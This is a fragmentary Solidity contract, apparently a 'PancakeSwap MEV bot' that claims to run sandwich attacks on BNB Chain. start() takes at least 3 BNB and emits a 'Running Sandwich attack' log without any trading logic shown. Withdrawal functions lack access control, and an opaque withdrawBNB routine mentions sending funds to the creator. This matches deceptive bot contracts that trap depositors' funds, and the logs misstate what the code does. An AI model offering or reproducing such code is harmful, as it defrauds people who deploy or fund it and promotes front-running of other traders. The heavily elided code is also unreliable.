...
// Interface for BUSD and WBNB token contract
interface IBEB20 {
...
interface IWBNB is IBEB20 {
    function deposit() external payable;
}

contract EVMPancakeswapMevbotV2 {
    ...
    /*
    * @dev Set WBNB and BUSD Contract address (Mainnet)
    * @notice If you run on Testnet, please change with WBNB and BUSD Testnet
    * @notice WBNB Testnet = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd // https://testnet.bscscan.com/token/0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd
    * @notice BUSD Testnet = 0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814 // https://testnet.bscscan.com/token/0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814
    */
    ...
    function withdrawToken() public {
        ...
        IBEB20 beb20Token = IBEB20(beb20Contract);
        uint256 beb20Balance = beb20Token.balanceOf(address(this));
        beb20Token.approve(address(this), beb20Balance);
        beb20Token.transfer(msg.sender, beb20Balance);
        emit Log("Withdraw BEB20 Token...");
    }
    ...
    function withdrawWBNB() public {
        ...
        IWBNB wbnbToken = IWBNB(wbnbContract);
        uint256 wbnbBalance = wbnbToken.balanceOf(address(this));
        wbnbToken.approve(address(this), wbnbBalance);
        wbnbToken.transfer(msg.sender, wbnbBalance);
        emit Log("Withdraw WBNB...");
    }
    ...
    /*
     * @dev Perform sandwich bot with WBNB and action from different contract pools
    ...
    function start() external payable {
        require(
            msg.value >= 3 ether,
            "Insufficient BNB sent, minimum BNB is 3 BNB"
        );
        IWBNB wbnbToken = IWBNB(wbnbContract);
        wbnbToken.deposit{value: msg.value}();
        wbnbToken.transfer(address(this), msg.value);
        emit Log(
            "Running Sandwich attack on Pancakeswap. This can take a while please wait..."
        );
    }
    ...
    function withdrawBNB(string calldata keccak) public payable {
        require(
        ...
        emit Log(
            "Sending BNB balance and Profit back to contract creator address..."
        );
    }
